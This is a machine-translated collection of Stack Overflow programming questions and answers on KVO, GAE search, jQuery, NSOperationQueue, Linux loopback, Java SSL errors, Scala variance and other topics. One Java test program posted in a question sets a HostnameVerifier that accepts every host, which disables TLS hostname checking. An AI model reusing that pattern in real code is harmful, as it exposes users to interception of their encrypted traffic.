我为一个对象订阅了来自另一个对象的一些更改，如下所示：

```
[objA addObserver:self
       forKeyPath:keyPath
          options:NSKeyValueObservingOptionNew | NSKeyValueObservingOptionOld
      context:nil]; 
```

当进行更改时

```
- (void) observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context 
```

叫做。

但是更改字典的“新”和“旧”键的值始终相同。这个问题只能在 iOS 4.x 中重现。在 iOS 5.x 中它运行良好。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T23:06:26.983

这取决于您所观察的内容以及该对象的变化方式。值得注意的是，如果对象指针没有变化，而是该对象的某些属性/属性发生了变化（例如，您有一个 NSMutableArray 并且您只是向数组添加了一个值，但 NSMutableArray 本身的地址没有改变），新旧指针实际上指向同一个对象，所以它看起来没有变化。通常在这些情况下，您甚至不会收到更改通知，但即使您手动调用`willChangeValueForKey`and `didChangeValueForKey`（例如，在某些自定义设置器中），旧值看起来与新值相同。如果您将更改值的代码更改为实际创建对象的新副本并释放旧副本，那么您将看到新值和旧值发生变化。

确保您的对象也[符合 KVO 标准](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/KeyValueObserving/Articles/KVOCompliance.html)。

如果您需要更多帮助，则必须提供有关您正在更改的对象以及如何更改它的更多细节（特别是源代码）。

# google-app-engine - 如何将经纬度地理定位点存储在文档中以进行 GAE 搜索？

> ID：10603950
> 
> 赞同：6
> 
> 时间：2012-05-15T15:25:38.893
> 
> 标签：google-app-engine, gae-search

[GoogleIO](http://youtu.be/7B7FyU9wW8Y?t=26m10s)中关于 Search API 的指示表明我们可以根据地理位置进行搜索。

我找不到[合适的字段](https://developers.google.com/appengine/docs/python/search/fieldclasses)来存储位置信息。

如何在[文档](https://developers.google.com/appengine/docs/python/search/documentclass)中存储地理位置信息，以便我可以根据与特定 GPS 位置的距离发出查询？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-28T12:54:32.323

2012 年 6 月 28 日，Google 将[GeoPoint 类](https://developers.google.com/appengine/docs/python/search/geopointclass)集成到 Google App Engine 搜索 API 库中，其特定目的是使空间点可搜索。

GeoPoints 作为 GeoFields 存储在搜索文档中。Google 提供了[此支持文档](https://developers.google.com/appengine/docs/python/search/overview#Performing_Location-Based_Searches)，概述了 GeoPoint 与 Search API 的使用。

以下示例声明一个 GeoPoint 并将其分配给搜索文档中的 GeoField。这些新类提供的功能比下面列出的要多得多，但这段代码是基本了解如何使用新的空间搜索功能的起点。

**使用关联的 GeoPoint 构建文档**

```
## IMPORTS ##
from google.appengine.api import search

def CreateDocument(content, lat, long):
  geopoint = search.GeoPoint(lat, long)
  return search.Document(
    fields=[
            search.HtmlField(name='content', value=content),
            search.DateField(name='date', value=datetime.now().date())
            search.GeoField(name='location', value=geopoint)
           ]) 
```

**搜索 GeoPoint 文档字段（根据 Search API 文档稍作修改）**

```
## IMPORTS ##
from google.appengine.api import search

ndx = search.Index(DOCUMENT_INDEX)
loc = (-33.857, 151.215)

query = "distance(location, geopoint(-33.857, 151.215)) < 4500"

loc_expr = "distance(location, geopoint(-33.857, 151.215))"

sortexpr = search.SortExpression(
  expression=loc_expr,
  direction=search.SortExpression.ASCENDING, default_value=4501)

search_query = search.Query(
  query_string=query,
  options=search.QueryOptions(
    sort_options=search.SortOptions(expressions=[sortexpr])))

results = index.search(search_query) 
```

# c# - 如何使用 PowerPoint 2010 互操作在自选图形上设置“无填充”填充

> ID：10603953
> 
> 赞同：0
> 
> 时间：2012-05-15T15:26:04.323
> 
> 标签：c#, ms-office, powerpoint, office-interop

我想知道如何使用 PowerPoint 2010 互操作将新添加的矩形设置为“无填充”。

这是我现在的代码......

```
PowerPoint.Presentation presentation = Globals.ThisAddIn.Application.ActivePresentation;
PowerPoint.Shape newshape = presentation.Slides[slideIndex].Shapes.AddShape(Office.MsoAutoShapeType.msoShapeRectangle, 72f, 72f, 72f, 72f);
newshape.Fill.Transparency = 1; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-16T10:32:28.140

尝试添加

```
newshape.Fill.Visible = Microsoft.Office.Core.MsoTriState.msoFalse 
```

# python - 如何在 Python 2.7 中通过将 Json 对象部分发送到文件来构建它？

> ID：10603954
> 
> 赞同：2
> 
> 时间：2012-05-15T15:26:10.447
> 
> 标签：python, json

我目前正在做一个项目，我最终创建了一个非常大的 JSON 字典字典。一次将整个对象保存在内存中会很痛苦，并且由于我正在逐个键计算将进入字典的内容，因此我希望有一种方法可以将每个键写入文件，我最终会将 json 转储为一旦它的值被计算出来。这样我就不需要一次在内存中保存一个以上的键/值对，这太棒了。

对象的形式为：

```
{key: {key: val, key: val, key:val, etc...},
 key: {key: val, key: val, key:val, etc...},
 key: {key: val, key: val, key:val, etc...},
 etc...
} 
```

如果我只是手动打印 JSON 中字典的开头和结尾以及我打印的每个 JSON 子字典周围的逗号，这不会很难做到，但我认为必须有一种方法可以通过 Python 的 JSON 库之一来做到这一点这样干净多了。想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:58:32.193

Python 的内置[`json`](http://docs.python.org/library/json.html)模块加载和转储整个对象，因此您不能直接使用它。有可用的事件驱动（[“SAX 风格”](http://en.wikipedia.org/wiki/Simple_API_for_XML)）JSON 解析器，例如[yajl](http://lloyd.github.com/yajl/)，它具有[Python 绑定](http://pykler.github.com/yajl-py/)。

就个人而言，除非必须，否则我尽量不使用 3rd-party 依赖项，因此我可能会手动打印开始/结束/键并使用内置 JSON 模块。或者只是将整个事情留在记忆中。它实际上需要多少内存？请记住，只有在您分析并发现它是一个问题时才进行优化。:-)

# javascript - jQuery上的分号

> ID：10603958
> 
> 赞同：7
> 
> 时间：2012-05-15T15:26:29.117
> 
> 标签：javascript, jquery

以下 jQuery 在函数后有或没有分号都可以使用。为什么？

```
jQuery(document).ready(function(){
jQuery("#red").treeview({
    animated: "fast",
    collapsed: true,
    control: "#treecontrol",
    persist: "cookie"
})

}); 
```

它适用于所有浏览器。这不会导致错误吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-15T15:27:29.493

JavaScript 实际上不需要分号。那只是惯例。

[http://inimino.org/~inimino/blog/javascript_semicolons](http://inimino.org/~inimino/blog/javascript_semicolons)

我推荐使用分号，就像我推荐你的代码缩进一样。

# javascript - 停止递归并重新开始

> ID：10603959
> 
> 赞同：0
> 
> 时间：2012-05-15T15:26:29.413
> 
> 标签：javascript, jquery

我有以下函数，在我的程序中调用一次。当没有用户交互时，它会在打印出数组时通过递归一遍又一遍地重新开始。但是，当用户单击链接时，应首先停止该函数（不再从数组输出），然后使用新参数再次启动。

```
function getText(mode){

        var para = mode;
        var url = "getText.php?mode=" + para;

        var arr = new Array();

        //get array via ajax-request

        var $div = $('#text_wrapper');

        $.each(arr, function(index, value){  
            eachID = setTimeout(function(){
                    $div.html(value).stop(true, true).fadeIn().delay(5000).fadeOut();
                    if(index == (arr.length-1)){
                        clearTimeout(eachID);
                        getText(para);
                    }
            }, 6000 * index); 
        });
    } 
```

我的代码并没有真正停止该函数，而是再次调用它。这最终导致多个输出并相互重叠。如何确保该功能一次只停止并运行一个？

```
$(document).ready(function() {
    $("#div1, #div2").click(function(e){
        e.preventDefault();
        var select = $(this).attr("id");
        clearTimeout(eachID);

        getText(select);
    });
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:30:25.313

`eachID`你一直用最新的覆盖`setTimeout`，所以当你`clearTimeout(eachID)`只停止最后一个时。

就个人而言，我喜欢做这样的事情：

```
id = 0;
timer = setInterval(function() {
    // do stuff with arr[id]
    id++;
    if( id >= arr.length) clearInterval(timer);
},6000); 
```

这样，您只运行一个计时器，您可以随时清除它。

# javascript - 如何使用jquery从div中获取价值

> ID：10603960
> 
> 赞同：2
> 
> 时间：2012-05-15T15:26:30.253
> 
> 标签：javascript, jquery, html

如何使用 Jquery 获取 div 的内容。

这是我的 HTML：

```
<div class="DataRow" data-vendorid="67">
    <div class="DataColumn" style="width: 60%;">
        Barracuda
    </div>
    <div class="DataColumn" style="width: 20%; text-align: center;">
        1
    </div>
    <div class="DataColumn" style="width: 20%; text-align: center;">
        2
    </div>
</div> 
```

这是我的jQuery：

```
$(function () {
    $('.DataRow').click(function () {
        // get value: Barracuda 
    });
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T15:28:08.003

```
$(function () {
    $('.DataRow').click(function () {
        alert($(this).find(':first-child').text());
    });
}); 
```

或者：

```
$(function () {
    $('.DataRow').click(function () {
        alert($(this).children().first().text());
    });
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T15:31:28.053

如果您需要获取单击的 div 的内容，它可能会对您有所帮助。

```
$(function () {
    $('.DataRow').click(function (event) {

        alert(event.target.innerHTML);
    });
});​ 
```

[**演示 1**](http://jsfiddle.net/95Cab/)

如果您只需要获取第一个值：

```
$('.DataRow').click(function () {
    var first = $(this).children().eq(0).html();
    alert(first);
});​ 
```

[**演示 2**](http://jsfiddle.net/95Cab/1/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T15:31:35.057

如果您只需要获取“Baracuda”，即第一个 div 文本，您可以像这样使用 innerHTML：

```
$(function () {
    $('.DataRow').click(function () {
        // get value: Barracuda 
        alert($(this).children("div")[0].innerHTML);
    });
});​ 
```

这是一个[例子](http://jsfiddle.net/ZemdY/)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T15:29:08.880

你也可以使用这个：

```
var value=$(".DataColumn").html(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-15T15:29:26.060

要获取第*一个*孩子的内容：

```
$('.DataRow').click(function () {
    var first = $(this).children(":first").html();
}); 
```

要获取*第三个*孩子的内容：

```
$('.DataRow').click(function () {
    var third = $(this).children(":eq(2)").html();
}); 
```

# objective-c - 全局 NSOperationQueue

> ID：10603963
> 
> 赞同：2
> 
> 时间：2012-05-15T15:26:37.227
> 
> 标签：objective-c, xcode, nsoperation, nsoperationqueue

我正在尝试创建一个 NSOperationQueue 并向其添加一个 NSOperation 。后来我不想检查队列是否正在运行并且可能会中止它。所有这些都应该从不同的函数中调用。这样做的最佳方法是什么？我会很高兴有一个代码示例。谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-07T16:29:56.213

我将创建一个由单例管理的操作队列。

首先，创建你的单例类。它将提供对`NSOperationQueue`. 我们称之为单例`MyGlobalQueueManager`。

它将有一个`ivar`被调用的`myGlobalQueue`：

```
@property (nonatomic) NSOperationQueue* myGlobalQueue; 
```

在 的`.m`文件中`MyGlobalQueueManager`，创建一个相当标准的`init`方法来设置操作队列：

```
- (id)init
{
    self = [super init];
    if (self)
    {
        myGlobalOperationQueue = [[NSOperationQueue alloc] init];
    }
    return self;
} 
```

现在，提供自己作为单例的方法。同样，这是非常标准的东西：

```
 + (MyGlobalQueueManager *)sharedInstance
{
    static MyGlobalQueueManager *sharedInstance = nil;
    static dispatch_once_t isDispatched;

    dispatch_once(&isDispatched, ^
                  {
                      sharedInstance = [[MyGlobalQueueManager alloc] init];
                  });

    return sharedInstance;
} 
```

让我们从您想使用它的任何地方访问该队列：

```
MyGlobalQueueManager* myGlobalQueueManager = [MyGlobalQueueManager sharedInstance];
NSOperationQueue *myGlobalQueue = myGlobalQueueManager.myGlobalOperationQueue; 
```

然后，您可以根据需要向该队列添加操作。

如何知道是否有任何东西排队？

```
NSUInteger count = [myGlobalQueue operationCount]; 
```

如何流产？取消一切如下：

```
[myGlobalQueue cancelAllOperations]; 
```

取消当然取决于操作。如果您正在编写自定义`NSOperation`类，则需要自己处理。

我发现`NSOperation`并且`NSOperationQueue`相当容易使用并且非常简单。

并发编程指南是一个很好的阅读文档。具体来说，看看[操作队列](http://developer.apple.com/library/mac/#documentation/General/Conceptual/ConcurrencyProgrammingGuide/OperationObjects/OperationObjects.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-11T07:06:02.923

一个更简单的方法是创建一个“全局可见”的函数。又名，在公共标头中声明它：

```
extern NSOperationQueue * SharedQueue(); 
```

并在您的编译“单元”中定义它 - 但***在***任何`@implementation`.

```
NSOperationQueue *SharedOperationQueue()
{
  static NSOperationQueue * _SharedQueue = nil;
  return _SharedQueue ?: ^{ _SharedQueue = NSOperationQueue.new;
                            _SharedQueue.maxConcurrentOperationCount = NSOperationQueueDefaultMaxConcurrentOperationCount;
                     return _SharedQueue;
  }();
} 
```

作为一个小奖励.. `#define`它带有“别名”..你真的可以滥用它！

```
#define MY_SOQ SharedOperationQueue()

[MY_SOQ addOperationWithBlock:^{ /* GO CRAZY */ }]; 
```

# perl - 一个矩阵文件加载到 Perl

> ID：10603964
> 
> 赞同：2
> 
> 时间：2012-05-15T15:26:42.830
> 
> 标签：perl, file-upload, multidimensional-array, matrix

我有一个方阵文件，我想将它加载到 Perl 中。我想像二维数组一样操作，在 C 中就像矩阵 [14] [50]，然后它直接进入第 14 行第 50 列。有没有办法做到这一点？

我可以直接修改输入文件还是必须将其加载到变量中，进行操作然后将其写出来？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T12:52:59.823

我编写了一个模块，它可能能够满足您的需求。[`Tie::Array::CSV`](http://p3rl.org/Tie%3a%3aArray%3a%3aCSV). 它创建了一个神奇的arrayrefs 数组（一个Perl 二维数组），它允许行和元素对文件进行读/写访问。根据您的列分隔符，您可能需要调整选项（默认为 CSV）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T16:02:04.860

它使用不同的语法非常相似。

```
>matrix <- array(1:10000, dim=c(100,100)) #50 X 50 matrix
>somevariable <- matrix[14,51] #somevariable will now be 5014 
```

把它变成一个 R 脚本

并从 perl 中调用它，例如

```
my $var = `rscript arguments`; # $var is now the output of your rscript 
```

# linux - Linux/Ubuntu 伪造网络连接

> ID：10603966
> 
> 赞同：0
> 
> 时间：2012-05-15T15:26:43.207
> 
> 标签：linux, networking, ubuntu

我有几个通过 HTTP 相互通信的程序。我有一个主程序，它是一个 HTTP 服务器，它充当其他程序查询的浏览器。

一切正常，如果...我的机器上有互联网连接，但是当我断开电缆连接时，eth0 出现故障，我无法连接任何东西。

在 Windows 中，我只需要一个环回网卡就可以了。

在我的 ubuntu 盒子（10.10）中，我仍然可以连接到它分配的 IP，但我不能强制 eth0 上升。

我如何在没有连接的情况下建立工作连接？！我可以伪造连接吗？

干杯安德烈·莫雷拉

* * *

澄清一下，我要做的第一件事是尝试发送广播以发现同一网络上的其他应用程序。

这是失败的，因为网络无法访问。尝试拔下电缆并 ping 到 255.255.255.255...

我想当我“解决这个问题”时，一切都会水到渠成。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:28:39.223

Linux 中有一个环回，它有一个 IP 地址（就像所有基于 IP 的网络接口一样）。

只需连接到`127.0.0.1`，或者`localhost`如果您的网络配置尚未定制为不遵循标准。

环回接口的别名通常是`lo`，这里是一个典型的条目`ifconfig`

```
lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:6026819 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6026819 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:2106315659 (1.9 GiB)  TX bytes:2106315659 (1.9 GiB) 
```

# java - HttpsURLConnection 在备用调用上获取 SSLHandshakeException

> ID：10603975
> 
> 赞同：2
> 
> 时间：2012-05-15T15:27:02.803
> 
> 标签：java, ssl, https, ssl-certificate

我在每次调用我的 Java 程序时都会遇到这个异常：

```
javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target 
```

我在 OpenSuSE Linux 机器上运行 Java 1.5.0_15。我已经从 VeriSign 网站下载了根证书并使用 keytool 导入了它们。

该代码没有任何异常 - 只需发送几个参数并读取响应。代码在这篇文章的最后。

看起来我没有安装必需的证书，但我真的不明白为什么我在每次调用时都会看到这个问题！？

我使用了 -Djavax.net.debug=ssl 并获得了工作调用和失败调用的输出。前几百行的输出是相同的，然后我从失败的调用中得到这个输出：

```
***
main, SEND TLSv1 ALERT:  fatal, description = certificate_unknown
main, WRITE: TLSv1 Alert, length = 2
main, called closeSocket()
main, handling exception: javax.net.ssl.SSLHandshakeException:
    sun.security.validator.ValidatorException: PKIX path building failed:
    sun.security.provider.certpath.SunCertPathBuilderException:
    unable to find valid certification path to requested target
    javax.net.ssl.SSLHandshakeException:
    sun.security.validator.ValidatorException: PKIX path building failed:
    sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
...

%% No cached client session
*** ClientHello, TLSv1 
```

由于 -Djavax.net.debug=ssl 属性生成的完整输出太多，无法包含在这篇文章中。

这是我正在使用的测试程序：

```
<imports go here>
public class HttpPoster
{
    public static final String s_target = "https://<url goes here>";
    private static final String s_parameters = "a=100&b=200";

    public void runTest()
    {
        HttpURLConnection connection = createHttpConnection(s_target);

        String response = null;
        int     statusCode = -1;
        String responseMessage = null;

        try
        {
            response = sendRequest(connection, s_parameters);
            statusCode = connection.getResponseCode();
            responseMessage = connection.getResponseMessage();

            System.out.println("Response = " +response);
            System.out.println("Status Code = " +statusCode);
            System.out.println("Response Message = " +responseMessage);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        finally
        {
            if (connection != null)
            {
                connection.disconnect();
                connection = null;
            }
        }
    }

    private String sendRequest(HttpURLConnection connection, String parameters)
    {
        StringBuffer buffer = new StringBuffer();

        try
        {
            // Calling getOutputStream() does an implicit connect()
            OutputStreamWriter outputWriter = new OutputStreamWriter(connection.getOutputStream());

            outputWriter.write(parameters);
            outputWriter.flush();

            // Get the response
            String line = null;

            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            while((line = bufferedReader.readLine()) != null)
            {
                buffer.append(line);
            }

            if (outputWriter != null) {
                outputWriter.close();
            }

            if (bufferedReader != null) {
                bufferedReader.close();
            }
        }
        catch (IOException ioe)
        {
            ioe.printStackTrace();
        }

        return buffer.toString();
    }

    private HttpURLConnection createHttpConnection(String url)
    {
        HttpURLConnection connection = null;

        try
        {
            connection = (HttpURLConnection)(new URL(url)).openConnection();

            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestMethod("POST");
            connection.setReadTimeout(15000);

            setHostNameVerifier(connection);

        }
        catch (MalformedURLException murlException)
        {
            murlException.printStackTrace();
        }
        catch (IOException ioException)
        {
            ioException.printStackTrace();
        }

        return connection;
    }

    private void setHostNameVerifier(HttpURLConnection c)
    {
        HostnameVerifier hv = null;

        if (c instanceof HttpsURLConnection)
        {
            hv = new HostnameVerifier()
            {
                public boolean verify(String urlHostName, SSLSession session)
                {
                    // Ignore the domain mismatch
                    return true;
                }
             };

            ((HttpsURLConnection)c).setHostnameVerifier(hv);
        }
    }

    public static void main(String[] args)
    {
            new HttpPoster().runTest();
    }
} 
```

谢谢，

保罗

# android - android中的地图叠加层

> ID：10603978
> 
> 赞同：1
> 
> 时间：2012-05-15T15:27:13.420
> 
> 标签：android, google-maps, overlay

我想问一下如何在我的 android 应用程序中添加不同的叠加层？因为我已经有一个扩展 Overlay 的覆盖类，它根据 KML 文件中的某些点绘制折线。现在我想创建另一个叠加层，使用 GPS 在用户位置添加一个图钉，所以我不知道如何做到这一点。

请问有人知道如何帮助我吗？先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:41:22.843

您可以在一张地图上拥有多个叠加层。

只需将第二层创建为`ItemizedOverlay`，并将其添加到地图中：

```
 `myMapView.getOverlays().add(myItemizedOverlay);` 
```

`要了解如何将标记添加到`ItemizedOverlay`，请参阅[http://android-coding.blogspot.com/2011/06/using-itemizedoverlay-to-add-marker-on.html](http://android-coding.blogspot.com/2011/06/using-itemizedoverlay-to-add-marker-on.html)。`

 `* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:47:08.247

[Android GoogleMaps API 文档](https://developers.google.com/maps/documentation/android/reference/overview-tree)也可能有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:50:21.803

要将引脚添加到用户的位置，请使用 MyLocationOverlay 它位于谷歌地图 API 中，请参阅此[链接](http://joshclemm.com/blog/?p=148)`

# javascript - 保护 API 以与 Javascript 小部件一起使用

> ID：10603980
> 
> 赞同：8
> 
> 时间：2012-05-15T15:27:14.853
> 
> 标签：javascript, api, oauth

我正在编写一个将由博主/网站所有者安装的 javascript 插件。它将与我的远程 API 进行通信。

我想知道如何保护 API 以确保只有注册了服务帐户的用户拥有的域才能访问 API 中的资源。我已经阅读了 OAuth2 并了解了基础知识，但是因为该插件将在浏览器中运行，而不是从服务器到服务器，所以我不确定这有多安全。

mixpanel、谷歌分析、olark 等大量服务使用相同的概念（即网站所有者在他们的网站上安装一行 JS），所以它必须是一个已解决的问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:29:41.143

您可以在脚本中插入`window.location`检查，以防止其他人直接将其包含在您的服务器之外。

但是，无法阻止人们在本地下载脚本、删除您的保护，然后自行托管。

您可以在所有服务器端请求中要求 API 密钥，但敌人很容易从合法站点窃取 API 密钥。

# c# - MonoTouch AOT 编译器 - 大型方法失败

> ID：10603981
> 
> 赞同：7
> 
> 时间：2012-05-15T15:27:17.633
> 
> 标签：c#, .net, xamarin.ios, aot, monogame

我正在开发一款游戏，我们一直以 JSON 格式存储关卡信息。这些级别非常大，因此我们切换到仅将它们存储在普通 C# 中：

*   顶级方法具有用于级别/对象名称的 switch 语句
*   有几种自动生成的方法可以使用标准属性初始化器“新建”我们的对象树

例子：

```
private OurObject Autogenerated_Object1()
{
   return new OurObject { Name = "Object1", X = 1, Y = 2, Width = 200, Height = 100 };
} 
```

除了这些方法非常大并且具有其他对象的嵌套列表/字典等。

这将加载关卡的时间从 2-3 秒加快到了几分之一秒（在 Windows 上）。与 JSON 相比，编译后的 IL 数据的大小也相当小。

问题是当我们在 MonoDevelop 中为 MonoTouch 编译这些时，我们得到：

`mtouch exited with code 1`

`-v -v -v`打开后，我们可以看到错误：

```
MONO_PATH=/Users/jonathanpeppers/Desktop/DrawAStickman/Game/Code/iOS/DrawAStickman.iPhone/bin/iPhone/Release/DrawAStickmaniPhone.app /Developer/MonoTouch/usr/bin/arm-darwin-mono --aot=mtriple=armv7-darwin,full,static,asmonly,nodebug,outfile=/var/folders/4s/lcvdj54x0g72nrsw9vzq6nm80000gn/T/tmp54777849.tmp/monotouch.dll.7.s "/Users/jonathanpeppers/Desktop/DrawAStickman/Game/Code/iOS/DrawAStickman.iPhone/bin/iPhone/Release/DrawAStickmaniPhone.app/monotouch.dll"
AOT Compilation exited with code 134, command:
MONO_PATH=/Users/jonathanpeppers/Desktop/DrawAStickman/Game/Code/iOS/DrawAStickman.iPhone/bin/iPhone/Release/DrawAStickmaniPhone.app /Developer/MonoTouch/usr/bin/arm-darwin-mono --aot=mtriple=armv7-darwin,full,static,asmonly,nodebug,outfile=/var/folders/4s/lcvdj54x0g72nrsw9vzq6nm80000gn/T/tmp54777849.tmp/DrawAStickmanCore.dll.7.s "/Users/jonathanpeppers/Desktop/DrawAStickman/Game/Code/iOS/DrawAStickman.iPhone/bin/iPhone/Release/DrawAStickmaniPhone.app/DrawAStickmanCore.dll"
Mono Ahead of Time compiler - compiling assembly /Users/jonathanpeppers/Desktop/DrawAStickman/Game/Code/iOS/DrawAStickman.iPhone/bin/iPhone/Release/DrawAStickmaniPhone.app/DrawAStickmanCore.dll
* Assertion: should not be reached at ../../../../../mono/mono/mini/mini-arm.c:2758 
```

为 AOT 编译时，方法中的行数是否有限制？我们可以传递一些论据`mtouch`来解决这个问题吗？有些文件工作正常，但特别是导致错误的文件有 3,000 行方法。无论如何，为模拟器编译都可以正常工作。

这仍然是一个实验，所以我们意识到这是一个非常疯狂的情况。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T16:01:28.460

当您遇到AOT 编译器中不应该出现*的*条件时，就会出现这些断言。请将此类情况报告给[http://bugzilla.xamarin.com](http://bugzilla.xamarin.com)

> 我们可以传递给 mtouch 来解决这个问题吗？

您*可以*通过使用 LLVM（或不使用它）来解决此问题，因为它是一个不同的代码生成引擎。根据发生的阶段（有些是共享的），您可能不会遇到相同的情况。

当然，LLVM 构建速度较慢且不支持调试，因此这不是适合所有情况的理想解决方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-16T20:47:15.497

只是关于存储级别的建议。您是否考虑过以协议缓冲区等非常快速的二进制格式存储关卡？.NET 有一个很棒的协议缓冲区库，称为[Protobuf-net](http://code.google.com/p/protobuf-net/)，您可能想查看它。

# function - 为什么 Function[-A1,...,+B] 不允许任何超类型作为参数？

> ID：10603982
> 
> 赞同：34
> 
> 时间：2012-05-15T15:27:22.850
> 
> 标签：function, scala, covariance, contravariance

我相信可以将协变（至少对于对象）定义为“使用较窄（子）类型的值代替较宽（超）类型的值的能力”，而逆变与这。

显然，Scala 函数是逆变参数类型 A1 等和协变返回类型 B 的 Function[-A1,...,+B] 的实例。虽然这对于函数的子类型化很方便，但上述定义不应该意味着我可以将任何超类型作为参数传递吗？

请告知我在哪里弄错了。

* * *

## 回答 #1

> 赞同：67
> 
> 时间：2012-05-15T15:46:10.953

协变和逆变是*类*的性质而不是*参数*的性质。（它们是取决于参数的品质，但它们对类做出陈述。）

因此，`Function1[-A,+B]`意味着*一个*接受超类的函数`A`可以被视为*原始函数*的子类。

让我们在实践中看看：

```
class A
class B extends A
val printB: B => Unit = { b => println("Blah blah") }
val printA: A => Unit = { a => println("Blah blah blah") } 
```

现在假设您需要一个知道如何打印 a 的函数`B`：

```
def needsB(f: B => Unit, b: B) = f(b) 
```

你可以通过`printB`。但你也*可以*传入`printA`，因为它也知道如何打印`B`s（以及更多！），就好像`A => Unit`是`B => Unit`. 这正是逆变的意思。这并不意味着您可以传递`Option[Double]`并`printB`获得任何东西，但编译时错误！

（协方差是另一种情况：`M[B] <: M[A]`如果`B <: A`。）

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2016-07-25T21:41:55.920

这个问题很老了，但我认为更清晰的解释是引用 Liskov 替换原则：关于超类的所有正确的东西都应该适用于它的所有子类。您应该能够使用 SubFoo 完成您可以使用 Foo 完成的所有操作，甚至更多。

假设我们有 Calico <: Cat <: Animal 和 Husky <: Dog <: Animal。我们来看一个`Function[Cat, Dog]`。哪些陈述是正确的？那里有两个：

(1) 你可以传入任何 Cat（所以任何 Cat 的子类）

(2) 可以对返回值调用任意 Dog 方法

那么`Function[Calico, Dog] <: Function[Cat, Dog]`有意义吗？不，对超类正确的陈述对子类不正确，即陈述（1）。您不能将任何 Cat 传递给只接受 Calico 猫的函数。

但是`Function[Animal, Dog] <: Function[Cat, Dog]`有意义吗？是的，所有关于超类的陈述都适用于子类。我仍然可以传入任何 Cat —— 事实上，我可以做的还不止这些，我可以传入任何 Animal —— 我可以在返回值上调用所有 Dog 方法。

所以`A <: B`暗示`Function[B, _] <: Function[A, _]`

现在，`Function[Cat, Husky] <: Function[Cat, Dog]`有意义吗？是的，所有关于超类的陈述都适用于子类；我仍然可以传入一个 Cat，我仍然可以在返回值上调用所有 Dog 方法——事实上我可以做的甚至更多，我可以在返回值上调用所有 Husky 方法。

但是`Function[Cat, Animal] <: Function[Cat, Dog]`有意义吗？不，对超类正确的陈述对子类不正确，即陈述（2）。我不能在返回值上调用 Dog 上可用的所有方法，只能调用 Animal 上可用的方法。

所以`Function[Animal, Husky]`我可以用 a 做所有我能做的事情`Function[Cat, Dog]`：我可以传入任何 Cat，并且可以在返回值上调用所有 Dog 方法。我可以做的更多：我可以传入其他动物，我可以调用 Husky 上可用而 Dog 上不可用的方法。所以这是有道理的：`Function[Animal, Husky] <: Function[Cat, Dog]`。第一个类型参数可以替换为超类，第二个类型参数可以替换为子类。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-05-15T15:45:54.063

这里有两个不同的想法在起作用。一种是使用子类型来允许将更具体的参数传递给函数（称为*subsumption*）。另一个是如何检查函数本身的子类型。

为了对函数的参数进行类型检查，您只需检查给定的参数是否是声明的参数类型的子类型。结果还必须是声明类型的子类型。这是您实际检查子类型的地方。

参数和结果的反/协方差仅在您想要检查给定*函数类型*是否是另一个函数类型的子类型时考虑。因此，如果参数具有 type `Function[A1, ... ,B]`，则参数必须是函数类型`Function[C1, ..., D]`where`A1 <: C1 ...`和`D <: B`。

这种推理并不特定于 Scala，并且适用于其他具有子类型的静态类型语言。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-01-08T17:01:20.313

简化的解释

```
class A
class B extends A
val printA: A => Unit = { a => println("Blah blah blah") }
printA(new A())   //"Blah blah blah"
printA(new B())   //"Blah blah blah" 
```

逆变规则：

如果`B`是 的子类型`A`，则`printA[A]`是 的子类型`printA[B]`

由于`printA[B]`是超类，我们可以使用`printA(new B())`

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-08-17T11:03:51.700

协变意味着从更宽（超级）转换为更窄（子）。例如，我们有两个类：一个是动物（超级），另一个是猫，然后使用协变，我们可以将动物转换为猫。

反变体与协变体正好相反，协变体意味着猫对动物。

不变意味着它无法转换。

# android - 将类转换为片段对象

> ID：10603987
> 
> 赞同：0
> 
> 时间：2012-05-15T15:27:55.343
> 
> 标签：android, class, object, android-fragments

如何将类转换为片段？我有以下情况：

片断片断；

